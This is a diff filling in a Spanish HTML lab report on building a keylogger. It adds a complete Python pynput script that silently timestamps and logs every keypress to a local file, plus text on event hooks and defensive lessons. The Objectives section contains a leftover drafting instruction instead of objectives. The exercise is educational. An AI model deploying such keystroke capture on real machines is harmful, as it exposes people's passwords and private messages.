@@ -40,17 +40,27 @@
         <!-- RECUADROS DE LA PRÁCTICA -->
         <section>
             <h2>Objetivos de la Práctica</h2>
-            <p>[Escribe aquí los objetivos. Ejemplo: Identificar vulnerabilidades en...]</p>
+            <p>Redacta un breve resumen indicando que el objetivo fue modificar un script de captura de teclado (keylogger) para añadirle persistencia de datos en un archivo local y una asociación temporal exacta para cada evento, permitiendo su análisis forense o de ciberseguridad.</p>
         </section>
 
         <section>
             <h2>Introducción</h2>
-            <p>[Escribe aquí tu introducción teórica sobre el tema de la práctica...]</p>
+            <p>La captura de entrada de teclado (comúnmente conocida como Keylogging) es una técnica utilizada en ciberseguridad que consiste en registrar de manera silenciosa las pulsaciones que realiza un usuario en su equipo.</p>
+ <p>Para lograr esto, se utilizan Event Hooks (ganchos de eventos) proporcionados por el sistema operativo. Un hook intercepta los eventos del sistema (como presionar o soltar una tecla) antes de que lleguen a la aplicación destino. Posteriormente, mediante el uso de Callbacks (funciones que se ejecutan como respuesta a un evento), el programa procesa, clasifica y almacena esta información.</p>
+ <p>El estudio de estas prácticas en un entorno de laboratorio controlado es fundamental. Como ingenieros, comprender cómo un programa malicioso logra persistencia, se asocia temporalmente a los eventos y exfiltra datos, nos permite desarrollar mejores mecanismos de defensa, detección y mitigación de amenazas (Endpoint Detection and Response).</p>
         </section>
 
         <section>
             <h2>Desarrollo</h2>
-            <p>[Describe aquí los pasos que seguiste, herramientas utilizadas, capturas de pantalla, etc.]</p>
+            <p>Herramientas utilizadas:
+
+Lenguaje de programación: Python 3.
+
+Librerías principales: pynput (para la gestión de event hooks del teclado) y datetime (para la generación de marcas de tiempo).
+
+Entorno de Desarrollo (IDE): Visual Studio Code.
+
+Entorno de pruebas: Sistema Operativo Windows 11.</p>
         </section>
 
         <section>
@@ -58,19 +68,45 @@
             <p>A continuación se muestra el script desarrollado para esta actividad:</p>
             <!-- Bloque especial para código -->
             <pre><code>
-# Reemplaza esto con tu script real (Python, Bash, etc.)
-def escaneo_basico(target):
-    print(f"Iniciando escaneo en {target}...")
-    # Lógica de seguridad aquí
-    return "Escaneo completado"
+from datetime import datetime
+from pynput.keyboard import Key, Listener
 
-escaneo_basico("192.168.1.1")
-            </code></pre>
+LOG_FILE = r"C:\Users\Arria_fa41996\OneDrive\Escritorio\registro_teclas.txt"
+event_counter = 1
+
+def write_to_file(text):
+    global event_counter
+    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
+    
+    with open(LOG_FILE, "a", encoding="utf-8") as f:
+        f.write(f"{now} | PRESS | evento_{event_counter:03d} | {text}\n")
+        
+    event_counter += 1 
+
+def on_press(key):
+    try:
+        print(f'Tecla alfanumerica presionada: {key.char}')
+        write_to_file(key.char)
+    except AttributeError:
+        print(f'Tecla Especial Presionada: {key}')
+        write_to_file(f'{key}')
+
+def on_release(key):
+    print(f'Tecla liberada: {key}')
+    if key == Key.esc:
+        #stop listener
+        return False
+
+
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()            </code></pre>
         </section>
 
         <section>
             <h2>Conclusiones</h2>
-            <p>[Escribe aquí tus conclusiones personales y lo que aprendiste de la actividad...]</p>
+            <p>Durante el desarrollo de esta actividad, se logró implementar y documentar exitosamente un programa capaz de interceptar eventos de teclado utilizando event hooks en un entorno de laboratorio. La modificación del código base permitió garantizar la persistencia de los datos en un archivo local sin sobrescribir información previa, mientras que la integración de la librería datetime aseguró una correlación temporal exacta con precisión de milisegundos.
+Desde la perspectiva de la ciberseguridad, esta práctica subraya el riesgo crítico que representan los keyloggers. Al registrar y almacenar entradas en texto plano de forma silenciosa, el script expone la vulnerabilidad de la información confidencial (como contraseñas o mensajes privados) ante accesos no autorizados al sistema. Entender la anatomía de este tipo de herramientas es un paso indispensable para poder implementar medidas defensivas efectivas, tales como el análisis de comportamiento de procesos y la protección avanzada de endpoints.
+</p>
         </section>
 
     </main>
